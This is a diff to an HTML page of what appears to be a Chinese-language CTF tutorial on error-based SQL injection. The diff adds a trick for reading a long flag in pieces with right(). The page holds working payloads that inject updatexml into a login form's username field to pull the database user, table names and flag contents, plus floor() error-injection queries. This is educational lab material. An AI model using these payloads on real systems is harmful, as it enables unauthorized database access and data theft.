@@ -1741,9 +1741,10 @@
 <p>原理:输入错误的第二个参数,更改路径的符号,使其报错带出我们想要的数据</p>
 <p>payload:<code>username=123&#39; or updatexml(1, concat(&#39;[&#39;,(select user()),&#39;]&#39;),3)%23&amp;password=123</code></p>
 <p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182127615.png" alt="image-20221018212700518"></p>
-<p>那么问题来了,这个<code>[]</code>or<code>&#123;&#125;</code>甚至是<code>~</code>的作用是什么,根据updatexml函数可以看出,第二条数据是xpath,Xpath是一门从html中提取数据的语言,这里我们们如果不加符号,会发现返回的数据不全,而这些符号的作用就是选中这些区块,使他们成为一个整体,然后从HTML中显示出来</p>
+<p>那么问题来了,这个<code>[]</code>or<code>&#123;&#125;</code>甚至是<code>~</code>的作用是什么,根据updatexml函数可以看出,第二条数据是xpath,Xpath是一门从html中提取数据的语言,这里我们们如果不加符号,会发现无法返回想要的数据,而这些符号的作用就是选中这些区块,使他们成为一个整体,然后从HTML中显示出来</p>
 <p>同理,我们可以拿到表名 payload:<code>username=123&#39; or updatexml(1, concat(&#39;[&#39;,(select group_concat(table_name)from information_schema.tables where table_schema=database()),&#39;]&#39;),3)%23&amp;password=123</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182143697.png" alt="image-20221018214325643"></p>
+<p>如果flag过长无法显示时，我们可以使用这种方法<code>1 union select 1,updatexml(1,concat(&#39;[&#39;,right((select flag from sqli.flag),31),&#39;]&#39;),1)</code></p>
+<p>意思是从右边读取31位,两部分拼接起来就可以了<br><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182143697.png" alt="image-20221018214325643"></p>
 <h5 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor 报错"></a>floor 报错</h5><p><code>select count(*) from users group by concat(database(),floor(rand(0)*2));</code></p>
 <p><code>select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;</code></p>
 <h5 id="整数溢出报错"><a href="#整数溢出报错" class="headerlink" title="整数溢出报错"></a>整数溢出报错</h5><h6 id="exp报错"><a href="#exp报错" class="headerlink" title="exp报错"></a>exp报错</h6><blockquote>
